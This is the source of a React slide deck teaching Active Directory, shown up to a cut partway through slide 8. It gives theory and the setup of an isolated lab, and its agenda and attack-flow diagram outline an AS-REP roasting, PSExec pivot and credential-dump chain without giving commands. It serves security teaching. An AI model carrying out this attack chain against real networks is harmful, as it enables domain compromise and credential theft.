"use client";

import { useState, useEffect, useCallback } from "react";

// ─── THEME CONTEXT ────────────────────────────────────────────────────────────
type Theme = "dark" | "light";

function ThemeToggle({
	theme,
	setTheme,
}: {
	theme: Theme;
	setTheme: (t: Theme) => void;
}) {
	const isDark = theme === "dark";
	return (
		<button
			onClick={() => setTheme(isDark ? "light" : "dark")}
			style={{
				display: "flex",
				alignItems: "center",
				gap: 10,
				background: "none",
				border: `1px solid ${isDark ? "#1e293b" : "#cbd5e1"}`,
				borderRadius: 999,
				padding: "6px 14px 6px 10px",
				cursor: "pointer",
				color: isDark ? "#64748b" : "#475569",
				fontFamily: "'JetBrains Mono', monospace",
				fontSize: "0.72rem",
				letterSpacing: "0.1em",
				transition: "all 0.2s",
			}}
		>
			{/* Track */}
			<div
				style={{
					width: 36,
					height: 20,
					borderRadius: 999,
					background: isDark ? "#0f2030" : "#e2e8f0",
					border: `1px solid ${isDark ? "#1e293b" : "#cbd5e1"}`,
					position: "relative",
					transition: "all 0.3s",
					flexShrink: 0,
				}}
			>
				{/* Thumb */}
				<div
					style={{
						position: "absolute",
						top: 2,
						left: isDark ? 2 : 16,
						width: 14,
						height: 14,
						borderRadius: "50%",
						background: isDark ? "#34d399" : "#f59e0b",
						transition: "left 0.3s, background 0.3s",
						boxShadow: isDark ? "0 0 6px #34d39980" : "0 0 6px #f59e0b80",
					}}
				/>
			</div>
			{isDark ? "🌙 DARK" : "☀ LIGHT"}
		</button>
	);
}

// ─── THEME VARS ───────────────────────────────────────────────────────────────
function getVars(theme: Theme) {
	if (theme === "dark")
		return {
			bg: "#050a0e",
			bgGrad: "radial-gradient(ellipse at 50% 0%, #0d2218 0%, #050a0e 70%)",
			presGrad: "radial-gradient(ellipse at 50% 0%, #0a1520 0%, #050a0e 80%)",
			text: "#cbd5e1",
			textStrong: "#f1f5f9",
			textMuted: "#64748b",
			textDim: "#475569",
			accent: "#34d399",
			dark: "#0E1012",
			db: "#1F75FE",
			border: "#0f2030",
			borderMid: "#1e293b",
			cardBg: "#060e18",
			cardBg2: "#0a1520",
			codeBg: "#060e18",
			slideLines: "rgba(0,255,100,0.012)",
			termColor: "#38bdf8",
			bodyText: "#94a3b8",
		};
	return {
		bg: "#f8fafc",
		bgGrad: "radial-gradient(ellipse at 50% 0%, #e8f5f0 0%, #f8fafc 70%)",
		presGrad: "radial-gradient(ellipse at 50% 0%, #eef6f2 0%, #f8fafc 80%)",
		text: "#334155",
		textStrong: "#0f172a",
		textMuted: "#64748b",
		textDim: "#94a3b8",
		accent: "#059669",
		dark: "#0E1012",
		db: "#1F75FE",
		border: "#e2e8f0",
		borderMid: "#cbd5e1",
		cardBg: "#ffffff",
		cardBg2: "#f1f5f9",
		codeBg: "#f1f5f9",
		slideLines: "rgba(0,100,50,0.04)",
		termColor: "#0284c7",
		bodyText: "#475569",
	};
}

// ─── COMPONENTS ───────────────────────────────────────────────────────────────
function CodeBlock({
	code,
	lang = "bash",
	theme,
}: {
	code: string;
	lang?: string;
	theme: Theme;
}) {
	const [copied, setCopied] = useState(false);
	const v = getVars(theme);
	return (
		<div
			style={{
				background: v.codeBg,
				border: `1px solid ${v.border}`,
				borderRadius: 6,
				overflow: "hidden",
				margin: "0.65rem 0",
			}}
		>
			<div
				style={{
					display: "flex",
					justifyContent: "space-between",
					alignItems: "center",
					padding: "7px 15px",
					background: v.cardBg2,
					borderBottom: `1px solid ${v.border}`,
				}}
			>
				<span
					style={{
						fontSize: "0.73rem",
						color: v.accent,
						letterSpacing: "0.1em",
						fontFamily: "'JetBrains Mono', monospace",
					}}
				>
					{lang}
				</span>
				<button
					style={{
						fontSize: "0.73rem",
						color: v.textMuted,
						background: "none",
						border: "none",
						cursor: "pointer",
						fontFamily: "'JetBrains Mono', monospace",
						letterSpacing: "0.05em",
					}}
					onClick={() => {
						navigator.clipboard.writeText(code);
						setCopied(true);
						setTimeout(() => setCopied(false), 2000);
					}}
				>
					{copied ? "✓ copied" : "copy"}
				</button>
			</div>
			<pre
				style={{
					padding: "1.15rem 1.3rem",
					overflowX: "auto",
					fontSize: "0.97rem",
					lineHeight: 1.8,
					color: theme === "dark" ? "#7dd3fc" : "#0E1012",
					whiteSpace: "pre",
					fontFamily: "'JetBrains Mono', monospace",
				}}
			>
				<code>{code}</code>
			</pre>
		</div>
	);
}

function StepList({
	steps,
	theme,
}: {
	steps: { n: number; title: string; desc: string }[];
	theme: Theme;
}) {
	const v = getVars(theme);
	return (
		<div
			style={{
				display: "flex",
				flexDirection: "column",
				gap: "1rem",
				margin: "0.65rem 0",
			}}
		>
			{steps.map((s) => (
				<div
					key={s.n}
					style={{ display: "flex", gap: "1rem", alignItems: "flex-start" }}
				>
					<div
						style={{
							fontSize: "0.85rem",
							color: v.accent,
							fontWeight: 700,
							letterSpacing: "0.05em",
							marginTop: 3,
							minWidth: 26,
							fontFamily: "'JetBrains Mono', monospace",
						}}
					>
						{String(s.n).padStart(2, "0")}
					</div>
					<div style={{ flex: 1 }}>
						<div
							style={{ fontSize: "1rem", color: v.textStrong, fontWeight: 600 }}
						>
							{s.title}
						</div>
						<div
							style={{
								fontSize: "0.88rem",
								color: v.textDim,
								marginTop: 3,
								lineHeight: 1.6,
							}}
						>
							{s.desc}
						</div>
					</div>
				</div>
			))}
		</div>
	);
}

function Pill({ label, color }: { label: string; color: string }) {
	return (
		<span
			style={{
				fontSize: "0.85rem",
				letterSpacing: "0.12em",
				border: `1px solid ${color}`,
				padding: "4px 13px",
				borderRadius: 3,
				fontFamily: "'JetBrains Mono', monospace",
				color,
			}}
		>
			{label}
		</span>
	);
}

function Alert({
	type,
	children,
	theme,
}: {
	type: "warn" | "info" | "danger";
	children: React.ReactNode;
	theme: Theme;
}) {
	const map = {
		warn: ["⚠", "#f59e0b"],
		info: ["ℹ", "#38bdf8"],
		danger: ["!", "#ef4444"],
	} as const;
	const [icon, color] = map[type];
	return (
		<div
			style={{
				display: "flex",
				alignItems: "flex-start",
				gap: 13,
				borderLeft: `3px solid ${color}`,
				padding: "13px 17px",
				background: theme === "dark" ? "rgba(255,255,255,0.02)" : `${color}08`,
				borderRadius: 4,
				margin: "1.2rem 0",
				fontSize: "0.97rem",
				lineHeight: 1.65,
			}}
		>
			<span
				style={{
					color,
					fontSize: "1.1rem",
					flexShrink: 0,
					fontWeight: 700,
					marginTop: 1,
				}}
			>
				{icon}
			</span>
			<div style={{ color }}>{children}</div>
		</div>
	);
}

function TwoCol({
	left,
	right,
}: {
	left: React.ReactNode;
	right: React.ReactNode;
}) {
	return (
		<div className="two-col">
			<div>{left}</div>
			<div>{right}</div>
		</div>
	);
}

function SH({
	children,
	color,
	theme,
}: {
	children: React.ReactNode;
	color?: string;
	theme: Theme;
}) {
	const v = getVars(theme);
	const c = color || v.db;
	return (
		<h3
			style={{
				fontSize: "0.93rem",
				letterSpacing: "0.2em",
				color: c,
				textTransform: "uppercase" as const,
				margin: "1.35rem 0 0.65rem",
				borderLeft: `2px solid ${c}`,
				paddingLeft: 10,
				fontFamily: "'JetBrains Mono', monospace",
			}}
		>
			{children}
		</h3>
	);
}

function BList({ items, theme }: { items: string[]; theme: Theme }) {
	const v = getVars(theme);
	return (
		<ul
			style={{
				listStyle: "none",
				display: "flex",
				flexDirection: "column",
				gap: 7,
			}}
		>
			{items.map((i, idx) => (
				<li
					key={idx}
					style={{
						fontSize: "0.95rem",
						color: v.bodyText,
						display: "flex",
						alignItems: "flex-start",
						gap: 9,
						lineHeight: 1.65,
					}}
				>
					<span style={{ color: v.accent, flexShrink: 0, marginTop: 3 }}>
						▸
					</span>{" "}
					{i}
				</li>
			))}
		</ul>
	);
}

function TermRow({
	k,
	v,
	theme,
	minW,
}: {
	k: string;
	v: string;
	theme: Theme;
	minW?: number;
}) {
	const vars = getVars(theme);
	return (
		<div
			style={{
				display: "flex",
				gap: "0.9rem",
				alignItems: "baseline",
				padding: "7px 0",
				borderBottom: `1px solid ${vars.border}`,
				fontSize: "0.93rem",
			}}
		>
			<span
				style={{
					color: vars.termColor,
					fontWeight: 600,
					whiteSpace: "nowrap",
					minWidth: minW || 95,
					fontFamily: "'JetBrains Mono', monospace",
					fontSize: "0.83rem",
				}}
			>
				{k}
			</span>
			<span style={{ color: vars.textMuted, lineHeight: 1.55 }}>{v}</span>
		</div>
	);
}

function HierarchyDiagram({ theme }: { theme: Theme }) {
	const levels = [
		{
			label: "Forest",
			icon: "🌲",
			color: "#a78bfa",
			desc: "Top-level security boundary",
			badge: "NTDS.dit schema",
		},
		{
			label: "Tree",
			icon: "🌳",
			color: "#38bdf8",
			desc: "Contiguous namespace + transitive trust",
			badge: "lab.local",
		},
		{
			label: "Domain",
			icon: "🏢",
			color: "#34d399",
			desc: "Administrative unit — DC stores & replicates",
			badge: "Domain Controller",
		},
		{
			label: "Organizational Unit",
			icon: "📂",
			color: "#f59e0b",
			desc: "GPO scope + delegated admin container",
			badge: "IT / HR / Finance",
		},
		{
			label: "Objects",
			icon: "👤",
			color: "#f87171",
			desc: "Users, Computers, Groups, Service Accounts",
			badge: "Leaf nodes",
		},
	];
	const v = getVars(theme);
	return (
		<div style={{ marginTop: "0.5rem" }}>
			{levels.map((lvl, i) => {
				const last = i === levels.length - 1;
				const nextColor = !last ? levels[i + 1].color : lvl.color;
				return (
					<div key={i} style={{ display: "flex", alignItems: "stretch" }}>
						<div
							style={{
								display: "flex",
								flexDirection: "column",
								alignItems: "center",
								width: 24,
								flexShrink: 0,
							}}
						>
							<div
								style={{
									width: 10,
									height: 10,
									borderRadius: "50%",
									flexShrink: 0,
									marginTop: 14,
									background: lvl.color + "20",
									border: `2px solid ${lvl.color}90`,
								}}
							/>
							{!last && (
								<div
									style={{
										flex: 1,
										width: 1.5,
										background: `linear-gradient(to bottom, ${lvl.color}50, ${nextColor}30)`,
									}}
								/>
							)}
						</div>
						<div
							style={{
								flex: 1,
								margin: "3px 0 3px 8px",
								borderRadius: 6,
								padding: "10px 14px",
								background:
									theme === "dark" ? lvl.color + "0d" : lvl.color + "10",
								border: `1px solid ${lvl.color}35`,
								borderLeft: `3px solid ${lvl.color}cc`,
								display: "flex",
								alignItems: "center",
								gap: 12,
							}}
						>
							<span
								style={{ fontSize: "1.2rem", flexShrink: 0, lineHeight: 1 }}
							>
								{lvl.icon}
							</span>
							<div style={{ minWidth: 0 }}>
								<div
									style={{
										fontSize: "0.87rem",
										fontWeight: 700,
										color: lvl.color,
									}}
								>
									{lvl.label}
								</div>
								<div
									style={{
										fontSize: "0.74rem",
										color: v.textMuted,
										marginTop: 2,
										fontFamily: "'JetBrains Mono', monospace",
									}}
								>
									{lvl.desc}
								</div>
							</div>
							<span
								style={{
									marginLeft: "auto",
									fontSize: "0.65rem",
									fontFamily: "'JetBrains Mono', monospace",
									padding: "2px 8px",
									borderRadius: 3,
									border: `1px solid ${lvl.color}40`,
									background: lvl.color + "10",
									color: lvl.color,
									whiteSpace: "nowrap",
									flexShrink: 0,
									opacity: 0.85,
								}}
							>
								{lvl.badge}
							</span>
						</div>
					</div>
				);
			})}
		</div>
	);
}

function ProtoCard({
	icon,
	name,
	color,
	rows,
	theme,
}: {
	icon: string;
	name: string;
	color: string;
	rows: [string, string][];
	theme: Theme;
}) {
	const v = getVars(theme);
	return (
		<div
			style={{
				background: v.cardBg,
				border: `1px solid ${color}50`,
				borderRadius: 7,
				padding: "1.15rem",
			}}
		>
			<div
				style={{
					display: "flex",
					alignItems: "center",
					gap: 10,
					marginBottom: "0.9rem",
				}}
			>
				<span style={{ fontSize: "1.4rem" }}>{icon}</span>
				<span
					style={{
						fontSize: "1rem",
						fontWeight: 700,
						color,
						letterSpacing: "0.03em",
					}}
				>
					{name}
				</span>
			</div>
			{rows.map(([k, val]) => (
				<TermRow key={k} k={k} v={val} theme={theme} />
			))}
		</div>
	);
}

function AttackFlowDiagram({ theme }: { theme: Theme }) {
	const v = getVars(theme);
	const nodes = [
		{
			label: "Arch Linux",
			sub: "192.168.56.1",
			icon: "🐧",
			color: "#f87171",
			role: "Attacker",
		},
		{
			label: "Windows Server 2025",
			sub: "192.168.56.105",
			icon: "🗄️",
			color: "#38bdf8",
			role: "DC · Pivot Node",
		},
		{
			label: "Windows 10",
			sub: "192.168.56.20",
			icon: "💻",
			color: "#34d399",
			role: "Final Target",
		},
	];
	const arrows = [
		{
			label: "AS-REP Roast → PSExec",
			step: "01",
			color: "#f87171",
			dash: false,
		},
		{ label: "PSExec via DC pivot", step: "02", color: "#f59e0b", dash: true },
	];
	return (
		<div
			style={{
				fontFamily: "'Courier New', monospace",
				background:
					theme === "dark"
						? "linear-gradient(135deg, #0a0e1a 0%, #0d1117 50%, #0a0e1a 100%)"
						: "linear-gradient(135deg, #f1f5f9 0%, #e8f4f0 50%, #f1f5f9 100%)",
				borderRadius: 16,
				padding: "2rem 1.5rem",
				border: `1px solid ${v.border}`,
				boxShadow:
					theme === "dark"
						? "0 0 60px rgba(0,0,0,0.5)"
						: "0 4px 24px rgba(0,0,0,0.08)",
				position: "relative",
				overflow: "hidden",
			}}
		>
			<div style={{ textAlign: "center", marginBottom: "1.5rem" }}>
				<span
					style={{
						fontSize: "0.65rem",
						letterSpacing: "0.25em",
						color: v.textMuted,
						textTransform: "uppercase" as const,
					}}
				>
					▸ ATTACK FLOW DIAGRAM
				</span>
			</div>
			<div
				style={{
					display: "flex",
					alignItems: "center",
					justifyContent: "center",
					gap: 0,
					flexWrap: "wrap" as const,
				}}
			>
				{nodes.map((n, i) => (
					<div key={i} style={{ display: "flex", alignItems: "center" }}>
						<div
							style={{
								background: theme === "dark" ? `${n.color}10` : `${n.color}15`,
								border: `1px solid ${n.color}40`,
								borderTop: `2px solid ${n.color}80`,
								borderRadius: 12,
								padding: "1.1rem 1.2rem",
								minWidth: 150,
								textAlign: "center",
								boxShadow: `0 0 20px ${n.color}10`,
							}}
						>
							<div style={{ fontSize: "1.8rem", marginBottom: 6 }}>
								{n.icon}
							</div>
							<div
								style={{
									fontSize: "0.82rem",
									fontWeight: 700,
									color: n.color,
									marginBottom: 5,
								}}
							>
								{n.label}
							</div>
							<div
								style={{
									fontSize: "0.72rem",
									color: v.textMuted,
									fontFamily: "'Courier New', monospace",
									marginBottom: 8,
								}}
							>
								{n.sub}
							</div>
							<div
								style={{
									fontSize: "0.62rem",
									color: n.color,
									border: `1px solid ${n.color}40`,
									background: `${n.color}12`,
									borderRadius: 4,
									padding: "3px 10px",
									display: "inline-block",
									letterSpacing: "0.06em",
									textTransform: "uppercase" as const,
								}}
							>
								{n.role}
							</div>
						</div>
						{i < nodes.length - 1 && (
							<div
								style={{
									display: "flex",
									flexDirection: "column",
									alignItems: "center",
									padding: "0 4px",
									gap: 6,
									minWidth: 130,
								}}
							>
								<div
									style={{
										fontSize: "0.6rem",
										color: arrows[i].color,
										background: `${arrows[i].color}15`,
										border: `1px solid ${arrows[i].color}40`,
										borderRadius: 3,
										padding: "2px 7px",
										letterSpacing: "0.12em",
									}}
								>
									STEP {arrows[i].step}
								</div>
								<div
									style={{
										fontSize: "0.64rem",
										color: arrows[i].color + "dd",
										fontFamily: "'Courier New', monospace",
										whiteSpace: "nowrap",
										textAlign: "center",
										marginBottom: 4,
									}}
								>
									{arrows[i].label}
								</div>
								<svg width="120" height="24" viewBox="0 0 120 24">
									<defs>
										<marker
											id={`ah${i}`}
											markerWidth="10"
											markerHeight="8"
											refX="9"
											refY="4"
											orient="auto"
										>
											<polygon points="0 0, 10 4, 0 8" fill={arrows[i].color} />
										</marker>
									</defs>
									<line
										x1="4"
										y1="12"
										x2="106"
										y2="12"
										stroke={arrows[i].color}
										strokeWidth="5"
										strokeOpacity="0.15"
										strokeDasharray={arrows[i].dash ? "8 5" : "none"}
									/>
									<line
										x1="4"
										y1="12"
										x2="102"
										y2="12"
										stroke={arrows[i].color}
										strokeWidth="2.2"
										strokeOpacity="0.95"
										strokeDasharray={arrows[i].dash ? "8 5" : "none"}
										markerEnd={`url(#ah${i})`}
									/>
								</svg>
							</div>
						)}
					</div>
				))}
			</div>
		</div>
	);
}

// ─── SLIDES FACTORY ───────────────────────────────────────────────────────────
function makeSlides(theme: Theme) {
	const v = getVars(theme);
	return [
		{
			id: 0,
			title: "Agenda",
			subtitle: "What we'll cover today",
			tag: "Overview",
			tagColor: "#38bdf8",
			content: (
				<div className="agenda-grid">
					{[
						{ n: "01", label: "Active Directory Overview", color: "#38bdf8" },
						{ n: "02", label: "What is AD DS?", color: "#38bdf8" },
						{ n: "03", label: "Core Components & Hierarchy", color: "#38bdf8" },
						{
							n: "04",
							label: "Protocols LDAP · Kerberos · DNS",
							color: "#38bdf8",
						},
						{ n: "05", label: "Real-World Enterprise Use", color: "#38bdf8" },
						{ n: "06", label: "Lab Environment Setup", color: "#34d399" },
						{ n: "07", label: "Install & Configure AD DS", color: "#34d399" },
						{
							n: "08",
							label: "Promote to Domain Controller",
							color: "#34d399",
						},
						{
							n: "09",
							label: "Populate AD — Users, Groups, OUs",
							color: "#34d399",
						},
						{
							n: "10",
							label: "AS-REP Roasting — The Misconfiguration",
							color: "#f87171",
						},
						{ n: "11", label: "Attacker Setup — Arch Linux", color: "#f87171" },
						{ n: "12", label: "Step 1 — Compromise the DC", color: "#f87171" },
						{ n: "13", label: "Step 2 — Pivot & Hit Win10", color: "#f87171" },
						{
							n: "14",
							label: "Post-Exploitation & Credential Dump",
							color: "#f87171",
						},
						{ n: "15", label: "Defence & Mitigation", color: "#a78bfa" },
						{ n: "16", label: "Summary", color: "#f59e0b" },
					].map((item) => (
						<div
							key={item.n}
							style={{
								display: "flex",
								alignItems: "center",
								gap: "0.9rem",
								border: `1px solid ${item.color}40`,
								padding: "0.8rem 1.1rem",
								borderRadius: 5,
								background:
									theme === "dark"
										? "rgba(255,255,255,0.01)"
										: "rgba(0,0,0,0.01)",
							}}
						>
							<span
								style={{
									fontSize: "0.8rem",
									fontWeight: 700,
									letterSpacing: "0.05em",
									flexShrink: 0,
									fontFamily: "'JetBrains Mono', monospace",
									color: item.color,
								}}
							>
								{item.n}
							</span>
							<span style={{ fontSize: "0.95rem", color: v.bodyText }}>
								{item.label}
							</span>
						</div>
					))}
				</div>
			),
		},
		{
			id: 1,
			title: "Active Directory",
			subtitle: "Overview & Why It Matters",
			tag: "Theory",
			tagColor: "#38bdf8",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>What is Active Directory?</SH>
							<p
								style={{ fontSize: "1rem", color: v.bodyText, lineHeight: 1.8 }}
							>
								Active Directory (AD) is Microsoft&apos;s centralized{" "}
								<strong style={{ color: v.textStrong }}>
									directory service
								</strong>{" "}
								for managing users, computers, and resources on a network.
								Introduced with{" "}
								<strong style={{ color: v.textStrong }}>
									Windows Server 2000
								</strong>
								, it has been the backbone of enterprise Windows networks ever
								since.
							</p>
							<p
								style={{
									fontSize: "1rem",
									color: v.bodyText,
									lineHeight: 1.8,
									marginTop: "0.85rem",
								}}
							>
								It acts as a{" "}
								<strong style={{ color: v.textStrong }}>central hub</strong> for
								authentication and authorization — every login, every file
								share, every printer access goes through AD.
							</p>
							{/* <SH theme={theme}>A simple analogy</SH>
							<p
								style={{ fontSize: "1rem", color: v.bodyText, lineHeight: 1.8 }}
							>
								Think of AD like a{" "}
								<strong style={{ color: v.textStrong }}>
									phone book + security guard
								</strong>{" "}
								for your entire organization.
							</p> */}
						</>
					}
					right={
						<>
							<SH theme={theme}>Five core facts</SH>
							{[
								["Introduced", "Windows Server 2000"],
								["Protocol", "LDAP for directory access"],
								["Auth", "Kerberos (default) + NTLM"],
								["Name resolution", "DNS — maps names to IPs"],
							].map(([k, val]) => (
								<TermRow key={k} k={k} v={val} theme={theme} />
							))}
							<Alert type="info" theme={theme}>
								AD is present in ~90% of Fortune 500 companies — making it the
								single most targeted service in enterprise security.
							</Alert>
						</>
					}
				/>
			),
		},
		{
			id: 2,
			title: "What is AD DS?",
			subtitle: "Active Directory Domain Services — the engine behind AD",
			tag: "Theory",
			tagColor: "#38bdf8",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>What is a Directory?</SH>
							<p
								style={{ fontSize: "1rem", color: v.bodyText, lineHeight: 1.8 }}
							>
								A <strong style={{ color: v.textStrong }}>directory</strong> is
								a hierarchical structure that stores information about objects
								on a network — users, computers, printers, groups.
							</p>
							<SH theme={theme}>What does AD DS do?</SH>
							<p
								style={{ fontSize: "1rem", color: v.bodyText, lineHeight: 1.8 }}
							>
								<strong style={{ color: v.textStrong }}>
									Active Directory Domain Services (AD DS)
								</strong>{" "}
								provides the methods for storing directory data and making it
								available to users and administrators.
							</p>
							{/* <SH theme={theme}>Three extra capabilities</SH>
							<BList
								theme={theme}
								items={[
									"Schema — defines what object types and attributes can exist in AD",
									"Global Catalog — searchable index of all objects across the entire forest",
									"Query & Index mechanism — lets users/apps quickly find objects by any property",
								]}
							/> */}
						</>
					}
					right={
						<>
							<SH theme={theme}>AD DS vs AD — what&apos;s the difference?</SH>
							{[
								["AD", "Umbrella brand for all Microsoft directory services"],
								["AD DS", "The core role — stores & manages domain objects"],
								["AD LDS", "Lightweight version for app-specific directories"],
								["AD CS", "Certificate Services — issues PKI certificates"],
								["AD FS", "Federation Services — SSO with external partners"],
							].map(([k, val]) => (
								<TermRow key={k} k={k} v={val} theme={theme} />
							))}
						</>
					}
				/>
			),
		},
		{
			id: 3,
			title: "Core Components & Hierarchy",
			subtitle: "How AD organizes everything",
			tag: "Theory",
			tagColor: "#38bdf8",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>Logical structure</SH>
							<HierarchyDiagram theme={theme} />
						</>
					}
					right={
						<>
							<SH theme={theme}>Each level explained</SH>
							{[
								[
									"🌲 Forest",
									"The security boundary. All domains share one schema and Global Catalog.",
								],
								[
									"🌳 Tree",
									"One or more domains connected by automatic two-way transitive trusts, sharing a contiguous namespace.",
								],
								[
									"🏢 Domain",
									"The administrative unit. A domain controller (DC) stores and replicates the domain database (NTDS.dit).",
								],
								[
									"📂 OU",
									"Organizational Unit — a container used to delegate admin rights and apply Group Policy.",
								],
								[
									"👤 Objects",
									"Leaf objects: Users, Computers, Groups, Printers, Service Accounts.",
								],
							].map(([k, val]) => (
								<div key={k} style={{ marginBottom: "0.95rem" }}>
									<div
										style={{
											fontSize: "0.95rem",
											color: v.textStrong,
											fontWeight: 700,
											marginBottom: 4,
										}}
									>
										{k}
									</div>
									<div
										style={{
											fontSize: "0.88rem",
											color: v.textMuted,
											lineHeight: 1.65,
										}}
									>
										{val}
									</div>
								</div>
							))}
						</>
					}
				/>
			),
		},
		{
			id: 4,
			title: "Protocols & Standards",
			subtitle: "The technical foundation of AD",
			tag: "Theory",
			tagColor: "#38bdf8",
			content: (
				<div
					style={{
						display: "grid",
						gridTemplateColumns: "repeat(auto-fit, minmax(218px, 1fr))",
						gap: "1rem",
					}}
				>
					<ProtoCard
						theme={theme}
						icon="📒"
						name="LDAP"
						color="#38bdf8"
						rows={[
							["Full name", "Lightweight Directory Access Protocol"],
							["Port", "389 / 636 (LDAPS — over TLS)"],
							["Role", "Read & write directory objects"],
							["Security", "Plain LDAP is unencrypted; LDAPS adds TLS"],
						]}
					/>
					<ProtoCard
						theme={theme}
						icon="🎟"
						name="Kerberos"
						color="#a78bfa"
						rows={[
							["Version", "Kerberos v5 default auth since Win 2000"],
							["Port", "88 (TCP/UDP)"],
							["Role", "Ticket-based auth — no password sent over wire"],
							["Key Risk", "AS-REP Roasting — crack hashes offline"],
						]}
					/>
					<ProtoCard
						theme={theme}
						icon="🌐"
						name="DNS"
						color="#34d399"
						rows={[
							["Port", "53 (TCP/UDP)"],
							["Role", "Clients use DNS to locate domain controllers"],
							["Without DNS", "Clients cannot join domain or log in"],
						]}
					/>
					<ProtoCard
						theme={theme}
						icon="🔐"
						name="NTLM"
						color="#f59e0b"
						rows={[
							["Type", "Challenge-response hash auth (legacy)"],
							["Port", "445 (SMB) / 135 (RPC)"],
							["Key Risk", "Pass-the-Hash — replay captured hash"],
							["Status", "Disabled by default in Server 2025"],
						]}
					/>
				</div>
			),
		},
		{
			id: 5,
			title: "Real-World Enterprise Use",
			subtitle: "What AD DS powers in production",
			tag: "Theory",
			tagColor: "#38bdf8",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>What AD manages in a real company</SH>
							<BList
								theme={theme}
								items={[
									"Single Sign-On (SSO) — log in once, access everything",
									"Centralised user provisioning and deprovisioning",
									"Group Policy — enforce password rules, screen locks, software",
									"File share permissions — mapped drives via GPO",
									"Email (Exchange / M365) — mailboxes tied to AD accounts",
								]}
							/>
							<SH theme={theme}>Typical AD roles in an org</SH>
							{[
								["Domain Admin", "Full control over the domain"],
								[
									"Enterprise Admin",
									"Forest-wide admin — highest possible privilege",
								],
								[
									"Service Account",
									"Non-interactive account used by apps/services",
								],
								[
									"Regular User",
									"Standard domain user — least-privilege baseline",
								],
							].map(([k, val]) => (
								<TermRow key={k} k={k} v={val} theme={theme} minW={140} />
							))}
						</>
					}
					right={
						<>
							<SH theme={theme}>Why AD is the #1 attack target</SH>
							<p
								style={{ fontSize: "1rem", color: v.bodyText, lineHeight: 1.8 }}
							>
								Compromising a single Domain Controller gives an attacker access
								to{" "}
								<strong style={{ color: v.textStrong }}>
									every resource in the domain
								</strong>
								.
							</p>
							<SH theme={theme}>Notable AD-related breaches</SH>
							{[
								[
									"WannaCry 2017",
									"EternalBlue → SMB → SYSTEM on DC → ransomware",
								],
								[
									"SolarWinds 2020",
									"Supply chain → Golden Ticket → full AD takeover",
								],
								[
									"Colonial Pipeline",
									"Compromised AD credentials → ransomware deployment",
								],
							].map(([k, val]) => (
								<div key={k} style={{ marginBottom: "0.95rem" }}>
									<div
										style={{
											fontSize: "0.95rem",
											color: "#f87171",
											fontWeight: 700,
										}}
									>
										{k}
									</div>
									<div
										style={{
											fontSize: "0.88rem",
											color: v.textMuted,
											lineHeight: 1.6,
										}}
									>
										{val}
									</div>
								</div>
							))}
							{/* <Alert type="danger" theme={theme}>
								This is why understanding AD from both sides — admin and
								attacker — is essential for any network professional.
							</Alert> */}
						</>
					}
				/>
			),
		},
		{
			id: 6,
			title: "Lab Environment",
			subtitle: "What you need before the practical demo",
			tag: "Part 1 · Setup",
			tagColor: "#34d399",
			content: (
				<>
					<Alert type="warn" theme={theme}>
						All VMs must be on a Host-Only / Internal network.
					</Alert>
					<div
						style={{
							display: "grid",
							gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))",
							gap: "1.1rem",
							margin: "1.1rem 0",
						}}
					>
						{[
							{
								name: "Arch Linux",
								role: "Attacker Machine",
								color: "#a78bfa",
								specs: [
									"IP: 192.168.56.1 (host-only)",
									"Metasploit + Impacket installed",
									"AS-REP Roasts the DC first",
									"Pivots through DC to reach Win10",
								],
							},
							{
								name: "Windows Server 2025",
								role: "Domain Controller · Pivot Node",
								color: "#38bdf8",
								specs: [
									"IP: 192.168.56.105 (static)",
									"AD DS installed + lab.local forest",
									"Windows Defender disabled for demo",
									"Acts as pivot between Arch and Win10",
								],
							},
							{
								name: "Windows 10",
								role: "Final Target Machine",
								color: "#f87171",
								specs: [
									"IP: 192.168.56.20 (static)",
									"Joined to lab.local domain",
									"Local Administrator account enabled",
									"Final target of the attack chain",
								],
							},
						].map((vm) => (
							<div
								key={vm.name}
								style={{
									border: `1px solid ${vm.color}60`,
									padding: "1.15rem",
									borderRadius: 7,
									background: v.cardBg,
								}}
							>
								<div
									style={{
										display: "flex",
										alignItems: "center",
										gap: 9,
										fontSize: "0.97rem",
										fontWeight: 700,
										marginBottom: 5,
										color: vm.color,
									}}
								>
									<div
										style={{
											width: 9,
											height: 9,
											borderRadius: "50%",
											background: vm.color,
											flexShrink: 0,
										}}
									/>
									{vm.name}
								</div>
								<div
									style={{
										fontSize: "0.85rem",
										color: v.textMuted,
										marginBottom: "0.9rem",
									}}
								>
									{vm.role}
								</div>
								<BList theme={theme} items={vm.specs} />
							</div>
						))}
					</div>
				</>
			),
		},
		{
			id: 7,
			title: "Install AD DS",
			subtitle: "Part 1 — Windows Server role installation",
			tag: "Part 1 · Setup",
			tagColor: "#34d399",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>Step-by-step via SConfig (Server Core)</SH>
							<StepList
								theme={theme}
								steps={[
									{
										n: 1,
										title: "Set static IP",
										desc: "SConfig → option 8 → select adapter index → set static: 192.168.56.105 / 255.255.255.0, DNS: 127.0.0.1",
									},
									{
										n: 2,
										title: "Rename the server",
										desc: "SConfig → option 2 → rename to DC01, reboot",
									},
									{
										n: 3,
										title: "Exit to PowerShell",
										desc: "SConfig → option 15 → opens PowerShell prompt",
									},
									{
										n: 4,
										title: "Install AD DS role",
										desc: "Run Install-WindowsFeature command (see right panel)",
									},
									{
										n: 5,
										title: "Promote to DC",
										desc: "Run Install-ADDSForest command — server reboots automatically",
									},
								]}
							/>
						</>
					}
					right={
						<>
							<SH theme={theme}>PowerShell commands (Server Core)</SH>
							<CodeBlock
								theme={theme}
								lang="powershell"
								code={`Install-WindowsFeature -Name AD-Domain-Services \`
  -IncludeManagementTools

Get-WindowsFeature AD-Domain-Services`}
							/>

							<BList
								theme={theme}
								items={[
									"AD DS binaries and management tools",
									"Active Directory Users and Computers (ADUC)",
									"Group Policy Management Console (GPMC)",
									"DNS Server role",
								]}
							/>
						</>
					}
				/>
			),
		},
		{
			id: 8,
			title: "Promote to Domain Controller",
			subtitle: "Part 1 — Creating the domain",
			tag: "Part 1 · Setup",
			tagColor: "#34d399",
			content: (
				<TwoCol
					left={
						<>
							<SH theme={theme}>PowerShell — one command</SH>
							<CodeBlock
								theme={theme}
								lang="powershell"
								code={`Install-ADDSForest \`
  -DomainName "lab.local" \`
  -DomainNetbiosName "LAB" \`
